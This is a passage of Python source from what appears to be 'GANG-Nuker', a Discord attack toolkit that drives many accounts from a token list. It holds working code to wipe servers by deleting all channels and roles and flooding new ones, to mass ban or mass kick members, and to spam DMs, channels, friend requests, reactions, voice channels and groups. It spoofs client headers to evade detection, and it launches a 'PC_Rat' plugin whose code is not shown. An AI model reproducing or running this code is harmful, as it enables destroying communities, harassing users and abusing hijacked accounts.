                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                        }

                        payload = {'recipient_id': idd}
                        r1 = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=headers,
                                           json=payload)

                        payload = {"content": messaage, "tts": False}
                        j = json.loads(r1.content)

                        r2 = requests.post(f"https://discord.com/api/v9/channels/{j['id']}/messages",
                                           headers=header, json=payload)

                        if r2.status_code == 429:
                            ratelimit = json.loads(r2.content)
                            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Ratelimit for",
                                  str(float(ratelimit['retry_after'])) + " seconds")
                            time.sleep(float(ratelimit['retry_after']))

                        if r1.status_code == 429:
                            ratelimit = json.loads(r1.content)
                            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Ratelimit for",
                                  str(float(ratelimit['retry_after'])) + " seconds")
                            time.sleep(float(ratelimit['retry_after']))

                        elif r2.status_code == 200:
                            print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Sent DM to: {idd}!")
                        continue

                except:
                    print(f'[{Fore.LIGHTRED_EX}>{Fore.RESET}] Token Got Locked')
                    dmspamre()

            dmspamre()



#   ACCOUNT NUKER
    if choice == '7':
        Spinner()
        token = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Token: ')
        validateToken(token)
        Server_Name = str(input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server Name?: '))
        message_Content = str(input(f'[\x1b[95m>\x1b[95m\x1B[37m] MassDM Message?: '))
        if threading.active_count() < threads:
            threading.Thread(target=utilities.Plugins.Account_Nuker.GANGNUKER_START, args=(token, Server_Name, message_Content)).start()



#   SERVER NUKER
    if choice == '8':
        Spinner()
        print(f'\n[\x1b[95m1\x1b[95m\x1B[37m] Account Server Nuker')
        print(f'[\x1b[95m2\x1b[95m\x1B[37m] Bot Server Nuker')

        choicee1 = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Choice?: ')

        if choicee1 == '1':
            token = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Token: ')
            print(f'[\x1b[95m1\x1b[95m\x1B[37m] Nuker')
            print(f'[\x1b[95m2\x1b[95m\x1B[37m] MassBan/MassKick')
            choicr = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Choice?: ')


            if choicr == '1':
                server = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')


                intents = discord.Intents.all()
                intents.members = True

                headerrs = {'Authorization': f'{token}',
                            "accept": "*/*",
                            'origin': 'https://discord.com',
                            'sec - fetch - mode': 'cors',
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'sec - fetch - site': 'same - origin',
                            'x - debug - options': 'bugReporterEnabled',
                            'x - super - properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAyMTEzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ =='
                            }
                client = commands.Bot(command_prefix="!", case_insensitive=False, self_bot=True, intents=intents)

                class UNuker:
                    def DeleteChannels(self, guild, channel):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headerrs)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(
                                        f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted Channel: {channel}")
                                    break
                                else:
                                    break

                    def DeleteRoles(self, guild, role):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}",
                                                headers=headerrs)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(
                                        f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted Role: {role}")
                                    break
                                else:
                                    break

                    async def Scrape(self):
                        await client.wait_until_ready()
                        guildOBJ = client.get_guild(int(server))

                        channelcount = 0
                        with open('utilities/QR/channels.txt', 'w') as c:
                            for channel in guildOBJ.channels:
                                c.write(str(channel.id) + "\n")
                                channelcount += 1
                            c.close()

                        rolecount = 0
                        with open('utilities/QR/roles.txt', 'w') as r:
                            for role in guildOBJ.roles:
                                r.write(str(role.id) + "\n")
                                rolecount += 1
                            r.close()

                    def SpamChannels(self, guild, name):
                        while True:
                            json = {'name': name, 'type': 0}
                            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headerrs,
                                              json=json)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Created Channel ")
                                    break
                                else:
                                    print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] You Cant Create Channels')

                    def SpamRoles(self, guild, name):
                        while True:
                            json = {'name': name}
                            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headerrs,
                                              json=json)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Created Role ")
                                    break
                                else:
                                    print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] You Cant Create Roles')
                                    break

                    async def NukeStart(self):
                        chh = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Channel Name: ")
                        cha = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Channel Amount: ")
                        rn = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Roles Name: ")
                        ra = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Roles Amount: ")

                        channels = open('utilities/QR/channels.txt')
                        roles = open('utilities/QR/roles.txt')

                        for channel in channels:
                            threading.Thread(target=self.DeleteChannels, args=(server, channel,)).start()
                        for role in roles:
                            threading.Thread(target=self.DeleteRoles, args=(server, role,)).start()
                        for i in range(int(cha)):
                            threading.Thread(target=self.SpamChannels, args=(server, chh,)).start()
                        for i in range(int(ra)):
                            threading.Thread(target=self.SpamRoles, args=(server, rn,)).start()

                    async def Menu(self):
                        await self.Scrape()
                        time.sleep(2)
                        await self.NukeStart()
                        time.sleep(2)
                        await self.Menu()

                    @client.event
                    async def on_ready(*Args):
                        await UNuker().Menu()

                    def Check(self):
                        client.run(token, bot=False)

                if __name__ == "__main__":
                    UNuker().Check()

                time.sleep(1)
                exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
                exit = clear()
                exit = spammer()

            if choicr == '2':
                print(
                    f'{Fore.LIGHTRED_EX}Warning{Fore.RESET} Make Sure Your Account Is Fully Verified Before Using This Command')

                intents = discord.Intents.all()
                intents.members = True

                headerrss = mainHeader(token)
                client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)

                client.remove_command("help")

                class MassBan:

                    def BanMembers(self, guild, member):
                        while True:
                            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}",
                                             headers=headerrss)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Banning {member}")
                                    break
                                else:
                                    break

                    def KickMembers(self, guild, member):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member}",
                                                headers=headerrss)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Kicking {member}')
                                    break
                                else:
                                    break

                    async def Scrape(self):
                        guild = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')
                        await client.wait_until_ready()
                        guildOBJ = client.get_guild(int(guild))
                        members = await guildOBJ.chunk()

                        try:
                            os.remove("utilities/QR/members.txt")
                        except:
                            pass

                        membercount = 0
                        with open('utilities/QR/members.txt', 'w') as m:
                            for member in members:
                                m.write(str(member.id) + "\n")
                                membercount += 1
                            print(f"Info: {membercount} Members")
                            m.close()

                    async def BanExecute(self):
                        guild = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')
                        print()
                        members = open('utilities/QR/members.txt')
                        for member in members:
                            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
                        members.close()

                    async def KickExecute(self):
                        guild = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')
                        print()
                        members = open('utilities/QR/members.txt')
                        for member in members:
                            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
                        members.close()

                    async def Menu(self):
                        print(f'\n[\x1b[95m1\x1b[95m\x1B[37m] MassBan')
                        print(f'[\x1b[95m2\x1b[95m\x1B[37m] MassKick')

                        choice = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Choice?: ')
                        if choice == '1':
                            await self.Scrape()
                            time.sleep(3)
                            sure = input('[\x1b[95m>\x1b[95m\x1B[37m] MassBAN y/n?: ').lower()
                            if sure == 'n':
                                await self.BanExecute()
                                time.sleep(2)
                                await self.Menu()

                            if sure == 'n':
                                exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
                                clear = lambda: os.system('cls')
                                exit = clear()
                                exit = spammer()

                        elif choice == '2':
                            await self.Scrape()
                            time.sleep(3)
                            sure = input('[\x1b[95m>\x1b[95m\x1B[37m] MassKick y/n?: ').lower()
                            if sure == 'y':
                                await self.KickExecute()
                                time.sleep(2)
                                await self.Menu()
                            if sure == 'n':
                                exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
                                clear = lambda: os.system('cls')
                                exit = clear()
                                exit = spammer()

                    @client.event
                    async def on_ready(*args):
                        await MassBan().Menu()

                    def Startup(self):
                        try:
                            client.run(token, bot=False)


                        except:
                            print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] Invalid Token...')
                            time.sleep(2)
                            exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
                            exit = clear()
                            exit = spammer()

                if __name__ == "__main__":
                    MassBan().Startup()

                time.sleep(1)
                exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
                exit = clear()
                exit = spammer()

        if choicee1 == '2':
            TOKEN = input('[\x1b[95m>\x1b[95m\x1B[37m] Bot Token: ')
            MAX_CHANNELS = 300
            print(f'[{Fore.LIGHTMAGENTA_EX}1{Fore.RESET}] Nuke Server?')
            print(f'[{Fore.LIGHTMAGENTA_EX}2{Fore.RESET}] Server MassBan?')

            choicee = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Choice?: ')

            if choicee == '1':
                chanless = input('[\x1b[95m>\x1b[95m\x1B[37m] Spam Channel Name?: ')
                spam = input('[\x1b[95m>\x1b[95m\x1B[37m] Message?: ')
                print(f'{Fore.LIGHTMAGENTA_EX}Type: !Nuke In Chat To Nuke The Server <3{Fore.RESET}')
                client = commands.Bot(command_prefix="!")

                @client.command()
                async def Nuke(ctx):
                    await ctx.message.delete()
                    guild = ctx.guild

                    for role in guild.roles:
                        try:
                            await role.delete()
                            print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] {role.name} Has Been Deleted')
                        except:
                            print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] {role.name} Has Not Been Deleted')

                    for channel in guild.channels:
                        try:
                            await channel.delete()
                            print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] {channel.name} Has Been Deleted')
                        except:
                            print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] You Cant Delete: {channel}')

                    try:
                        for i in range(MAX_CHANNELS):
                            await guild.create_text_channel(chanless)
                            print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] {chanless} Has Been Created!')
                    except:
                        print(f'[{Fore.LIGHTRED_EX}>{Fore.RESET}] You havent got permission to create channels')

                @client.event
                async def on_guild_channel_create(channel):
                    while True:
                        try:
                            await channel.send(spam)
                            print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Spamming Server')

                        except:
                            print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] Spamming Cancelled')

                def thread():
                    threading.Thread(target=on_guild_channel_create, args=(client.run(TOKEN))).start()

                thread()

                def thread2():
                    threading.Thread(target=Nuke, args=(client.run(TOKEN))).start()

                thread2()

            if choicee == '2':
                print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Type {Fore.LIGHTGREEN_EX}!massban{Fore.RESET} in chat to Massban...')
                headers = {
                    "Authorization":
                        f"Bot {TOKEN}"
                }

                client2 = commands.Bot(
                    command_prefix='!',
                    intents=discord.Intents.all(),
                    help_command=None
                )

                @client2.command()
                async def massban(ctx):
                    await ctx.message.delete()
                    servr = ctx.guild.id

                    def mass_ban(i):
                        sessions = requests.Session()
                        sessions.put(
                            f"https://discord.com/api/v9/guilds/{servr}/bans/{i}",
                            headers=headers
                        )

                    for i in range(3):
                        for member in list(ctx.guild.members):
                            threading.Thread(
                                target=mass_ban,
                                args=(member.id,)
                            ).start()
                    print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done')

                client2.run(TOKEN)

        time.sleep(5)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   SPAMMER
    if choice == '9':
        Spinner()
        print(f"""\n[{Fore.LIGHTRED_EX}!{Fore.RESET}] Make Sure Your Tokens Are In tokens.txt For The Spammer To Work!\n""")
        tokens = open("tokens.txt", "r").read().splitlines()
        server = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')
        channel = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Channel ID: ')
        mess = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Message?: ')
        delay = float(input(f'[\x1b[95m>\x1b[95m\x1B[37m] Delay: '))
        ch = input('[\x1b[95m>\x1b[95m\x1B[37m] Random Strings: y/n?: ').lower()
        mas = input('[\x1b[95m>\x1b[95m\x1B[37m] MassPing?: y/n?: ').lower()

        if mas == 'y':
            with open("tokens.txt") as f:
                firstline = f.readline().rstrip()
            bot = discum.Client(token=firstline)

            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    print(str(lenmembersfetched) + ' members fetched')
                    bot.gateway.removeCommand(
                        {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                    bot.gateway.close()

            def get_members(guild_id, channel_id):
                bot.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
                bot.gateway.command(
                    {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(server, channel)
            memberslist = []

            for memberID in members:
                memberslist.append(memberID)
                print(memberID)

            f = open('utilities/QR/users.txt', "w")
            for element in memberslist:
                f.write(f'<@{element}>' + '\n')
            f.close()

        def spam(token, mess):
            if mas == 'y':
                with open("utilities/QR/users.txt", "r") as file:
                    allText = file.read()
                    words = list(map(str, allText.split()))
                    mess += ''.join(random.choice(words))

            if ch == 'y':
                mess += " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))

            elif ch == 'n':
                pass

            else:
                pass

            url = 'https://discord.com/api/v9/channels/' + channel + '/messages'
            payload = {"content": mess, "tts": False}
            header = mainHeader(token)

            while True:
                time.sleep(delay)
                src = requests.post(url, headers=header, json=payload)

                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    print(f"{Fore.LIGHTRED_EX}[!]{Fore.RESET} Ratelimit for",
                          str(float(ratelimit['retry_after'])) + " seconds")
                    time.sleep(float(ratelimit['retry_after']))

                elif src.status_code == 200:
                    print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Sent: {mess}')

                elif src.status_code == 401:
                    print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Invalid Token')
                elif src.status_code == 404:
                    print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Not Found')
                elif src.status_code == 403:
                    print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Token Doesnt Have Perms For This Channel!')

        def thread():
            text = mess
            for token in tokens:
                threading.Thread(target=spam, args=(token, text)).start()

        start = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER To Start: ')
        start = thread()

        time.sleep(2)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        clear()
        exit = spammer()



#   DM SPAMMER (NEED TO FIX!)
    if choice == '10':
        Spinner()
        gh = input(f"""
DM Spammer is in the Paid Version of GANG-Nuker!\nIf You Are Wanting to Purchase Make Sure to Checkout the Offical GANG-Nuker Website!

[\x1b[95m1\x1b[95m\x1B[37m] GANG-Nuker Website
[\x1b[95m2\x1b[95m\x1B[37m] Exit
  
[\x1b[95m>\x1b[95m\x1B[37m] Choice?: """)

        if gh in ['01','1']:
            webbrowser.open('https://gangnuker.com')
        elif gh in ['02','2']:
            exit = spammer()
        else:
         print('')



#   FRIEND REQ SPAMMER
    if choice == '11':
        Spinner()
        def friender(token, user):
            try:
                user = user.split("#")
                headers = mainHeader(token)
                payload = {"username": user[0], "discriminator": user[1]}
                src = requests.post('https://discord.com/api/v9/users/@me/relationships', headers=headers,
                                    json=payload)
                if src.status_code == 204:
                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Friend Request Sent to {user[0]}#{user[1]}! ")
            except Exception as e:
                print(e)

        user = input(f"\n[\x1b[95m>\x1b[95m\x1B[37m] Username + Tag: ")
        tokens = open("tokens.txt", "r").read().splitlines()
        delay = float(input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Delay: '))
        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=friender, args=(token, user)).start()

        time.sleep(2)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   HYPESQUAD JOINER
    if choice == '12':
        Spinner()
        print(f'''\n[\x1b[95m1\x1b[95m\x1B[37m] {Fore.MAGENTA}Bravery{Fore.RESET}
[\x1b[95m2\x1b[95m\x1B[37m] {Fore.LIGHTRED_EX}Brilliance{Fore.RESET}
[\x1b[95m3\x1b[95m\x1B[37m] {Fore.LIGHTCYAN_EX}Balance{Fore.RESET}
[\x1b[95m4\x1b[95m\x1B[37m] Leave The HypeSquad''')

        house = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Choice: ")

        def hype(token):
            headers = mainHeader(token)

            if house == "1":
                housefinal = '1'

            if house == "2":
                housefinal = '2'

            if house == "3":
                housefinal = '3'

            if house == '4':
                housefinal = None

            if house == '1' or '2' or '3':
                payload = {
                    'house_id': housefinal
                }
                rep = requests.post("https://discord.com/api/v9/hypesquad/online", json=payload, headers=headers)
                if rep.status_code == 204:
                    print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done')
                else:
                    print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed')

            if house == '4':
                payload = {
                    'house_id': housefinal
                }
                req = requests.delete('https://discord.com/api/v9/hypesquad/online', headers=headers, json=payload)
                if req.status_code == 204:
                    print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done')
                else:
                    pass

            else:
                pass

        tokens = open('tokens.txt', 'r').read().splitlines()
        for token in tokens:
            threading.Thread(target=hype(token)).start()

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   REACTION SPAMMER
    if choice == '13':
        Spinner()
        def reaction(chd, iddd, org, token):
            headers = {'Content-Type': 'application/json',
                       'Accept': '*/*',
                       'Accept-Encoding': 'gzip, deflate, br',
                       'Accept-Language': 'en-US',
                       'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                       'DNT': '1',
                       'origin': 'https://discord.com',
                       "sec-fetch-dest": "empty",
                       "sec-fetch-mode": "cors",
                       "sec-fetch-site": "same-origin",
                       'TE': 'Trailers',
                       'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                       'authorization': token,
                       'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                       }

            emoji = ej.emojize(org, use_aliases=True)
            a = requests.put(
                f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
                headers=headers)
            if a.status_code == 204:
                print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Reaction {org}")
            else:
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error")

        tokens = open('tokens.txt', 'r').read().splitlines()
        chd = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Channel ID?: ')
        iddd = input('[\x1b[95m>\x1b[95m\x1B[37m] Message ID?: ')
        emoji = input('[\x1b[95m>\x1b[95m\x1B[37m] Emoji?: ')
        delay = int(input('[\x1b[95m>\x1b[95m\x1B[37m] Delay?: '))
        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=reaction, args=(chd, iddd, emoji, token)).start()

        time.sleep(1)
        exit = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   NICKNAME CHANGER
    if choice == '14':
        Spinner()
        def changenick(server, nickname, token):
            headers = mainHeader(token)

            r = requests.patch(f"https://discord.com/api/v9/guilds/{server}/members/@me/nick", headers=headers,
                               json={"nick": nickname})
            if r.status_code == 200:
                print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Nickname Changed ')
            if r.status_code != 200:
                print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] Cant Change Nickname... {Fore.RESET}')

        tokens = open('tokens.txt', 'r').read().splitlines()
        server = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ")
        nick = input("[\x1b[95m>\x1b[95m\x1B[37m] Nickname?: ")
        for token in tokens:
            threading.Thread(target=changenick, args=(server, nick, token)).start()

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   WEBHOOK SPAMMER
    if choice == '15':
        Spinner()
        exec(open('utilities/Plugins/Webhook_Spammer.py').read())



#   VC SPAMMER
    if choice == '16':
        Spinner()
        tokenlist = open(easygui.fileopenbox(), 'r').read().splitlines()
        channel = int(input("\n[\x1b[95m>\x1b[95m\x1B[37m] Voice Channel ID: "))
        server = int(input("[\x1b[95m>\x1b[95m\x1B[37m] Server ID: "))
        deaf = input("[\x1b[95m>\x1b[95m\x1B[37m] Defean: (y/n)? ")
        if deaf == "y":
          deaf = True
          if deaf == "n":
            deaf = False
        mute = input("[\x1b[95m>\x1b[95m\x1B[37m] Mute: (y/n)? ")
        if mute == "y":
          mute = True
          if mute == "n":
            mute = False
        stream = input("[\x1b[95m>\x1b[95m\x1B[37m] Stream: (y/n)? ")
        if stream == "y":
          stream = True
          if stream == "n":
            stream = False
        video = input("[\x1b[95m>\x1b[95m\x1B[37m] Video: (y/n)? ")
        if video == "y":
          video = True
          if video == "n":
            video = False

        executor = ThreadPoolExecutor(max_workers=int(1000))
        def run(token):
          while True:
            ws = WebSocket()
            ws.connect("wss://gateway.discord.gg/?v=8&encoding=json")
            hello = loads(ws.recv())
            heartbeat_interval = hello['d']['heartbeat_interval']
            ws.send(dumps({"op": 2,"d": {"token": token,"properties": {"$os": "windows","$browser": "Discord","$device": "desktop"}}}))
            ws.send(dumps({"op": 4,"d": {"guild_id": server,"channel_id": channel,"self_mute": mute,"self_deaf": deaf, "self_stream?": stream, "self_video": video}}))
            ws.send(dumps({"op": 18,"d": {"type": "guild","guild_id": server,"channel_id": channel,"preferred_region": "singapore"}}))
            ws.send(dumps({"op": 1,"d": None}))
            sleep(0.1)

        i = 0
        for token in tokenlist:
          executor.submit(run, token)
          i+=1
          print("[\x1B[32m>\x1B[32m\x1B[37m] Joined VC")
          sleep(0.01)
        yay = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER to Stop VC Spammer!")



#   PC RAT
    if choice == '17':
        Spinner()
        exec(open('utilities/Plugins/PC_Rat.py').read())


#   ABOUT/ACTIVITY
    if choice == '18':
        Spinner()
        http.client._is_legal_header_name = re.compile(b'[^\\s][^:\\r\\n]*').fullmatch
        print(f'\n[\x1b[95m1\x1b[95m\x1B[37m] About Changer')
        print(f'[\x1b[95m2\x1b[95m\x1B[37m] Activity Status Changer')
        changg = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Choice: ')
        if changg == '1':

            def abouttt(token, abbb):
                try:
                    headers = secondHeader(token)
                    rd = requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json={'bio': abbb})
                    if rd.status_code == 200:
                        print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done')
                    else:
                        print(
                            f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error")

                except:
                    print('Error...')

            tokens = open('tokens.txt', 'r').read().splitlines()
            ab = input('[\x1b[95m>\x1b[95m\x1B[37m] About: ')
            for token in tokens:
                threading.Thread(target=abouttt, args=(token, ab)).start()

        if changg == '2':
            def activity(token, act):
                ws = websocket.WebSocket()
                actt = 'Online'
                ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
                gjs = {'name': act,
                       'type': 0}
                auth = {'op': 2,
                        'd': {'token': token,
                              'properties': {'$os': sys.platform,
                                             '$browser': 'RTB',
                                             '$device': f"{sys.platform} Device"},
                              'presence': {'game': gjs,
                                           'status': actt,
                                           'since': 0,
                                           'afk': False}},
                        's': None,
                        't': None}
                ws.send(json.dumps(auth))
                print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Activity Status: {act}')

            tokens = open('tokens.txt', 'r').read().splitlines()
            text = input('[\x1b[95m>\x1b[95m\x1B[37m] Activity Status: ')
            for token in tokens:
                threading.Thread(target=activity, args=(token, text)).start()

        time.sleep(1)

        time.sleep(1)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()



#   SERVER LOOKUP
    if choice == '19':
        Spinner()
        exec(open('utilities/Plugins/Server_Lookup.py').read())



#   TOKEN INFOMATION
    if choice == '20':
        Spinner()
        token = input(
        f'\n[\x1b[95m>\x1b[95m\x1B[37m] Account Token: ')
        validateToken(token)
        utilities.Plugins.Token_Info.Info(token)



#   STATUS CHANGER
    if choice == '21':
        Spinner()
        def ChangeStatus(token, status):
            session = requests.Session()
            headers = {
                'authorization': token,
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.306 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36',
                'content-type': 'application/json'
            }
            data = '{"custom_status":{"text":"' + status + '"}}'
            r = session.patch('https://discordapp.com/api/v6/users/@me/settings', headers=headers, data=data)
            print('[\x1B[32m>\x1B[32m] Done ')

        tokens = open('tokens.txt', 'r').read().splitlines()
        status = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Status?: ')
        for token in tokens:
            threading.Thread(target=ChangeStatus, args=(token, status)).start()

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   GROUP SPAMMER
    if choice == '22':
        Spinner()
        token = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Token: ')
        UserID = input('[\x1b[95m>\x1b[95m\x1B[37m] User ID: ')
        group = input('[\x1b[95m>\x1b[95m\x1B[37m] Group Names: ')
        manygr = int(input('[\x1b[95m>\x1b[95m\x1B[37m] How Many Groups: '))

        headers = mainHeader(token)


        for i in range(manygr):
            try:
                r = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers,
                                  json={"recipients": []})

                jsr = json.loads(r.content)
                groupID = jsr['id']
                time.sleep(0.5)
                r1 = requests.patch(f'https://discord.com/api/v9/channels/{groupID}', headers=headers,
                                    json={'name': group})
                if r1.status_code == 200:
                    print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Group created')

